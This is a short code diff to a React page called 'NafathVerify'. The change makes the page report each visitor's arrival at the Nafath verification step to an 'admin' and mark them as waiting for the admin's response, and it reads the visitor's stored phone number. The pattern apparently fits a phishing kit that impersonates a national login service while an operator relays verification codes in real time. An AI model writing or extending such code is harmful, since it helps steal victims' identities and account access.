@@ -6,8 +6,9 @@ import { Button } from "@/components/ui/button";
 import {
   verificationCode,
   isFormApproved,
-  updatePage,
+  navigateToPage,
   visitor,
+  sendData,
 } from "@/lib/store";
 
 export default function NafathVerify() {
@@ -19,7 +20,13 @@ export default function NafathVerify() {
 
   // Emit page enter and get data from localStorage
   useEffect(() => {
-    updatePage("تحقق نفاذ");
+    navigateToPage("تحقق نفاذ");
+    
+    // إرسال حالة الانتظار للأدمن
+    sendData({
+      current: "تحقق نفاذ",
+      waitingForAdminResponse: true,
+    });
     
     // جلب رقم الجوال واسم الخدمة من localStorage
     const phone = visitor.value.phone || localStorage.getItem('userPhone') || '';
